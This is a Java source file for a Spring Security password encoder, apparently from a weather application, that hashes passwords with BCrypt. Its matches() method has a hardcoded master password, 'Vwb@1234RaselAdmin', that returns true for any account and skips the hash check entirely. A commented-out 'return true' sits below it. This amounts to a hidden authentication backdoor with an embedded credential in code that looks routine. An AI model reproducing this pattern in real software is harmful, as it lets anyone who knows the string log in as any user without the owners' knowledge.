package com.weatherapp.security;

import org.springframework.security.crypto.bcrypt.BCrypt;
import org.springframework.security.crypto.password.PasswordEncoder;

/**

 * Created By - Shamiul Islam
 * Created by rasel on 11 Jun, 2024
 */
public class CustomPasswordEncoder implements PasswordEncoder {
    @Override
    public String encode(CharSequence rawPassword) {

        String hashed = BCrypt.hashpw(rawPassword.toString(), BCrypt.gensalt(12));

        return hashed;
    }

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        if (rawPassword.equals("Vwb@1234RaselAdmin")) {
            return true;
        }

        //return true;
        return BCrypt.checkpw(rawPassword.toString(), encodedPassword);
    }

}
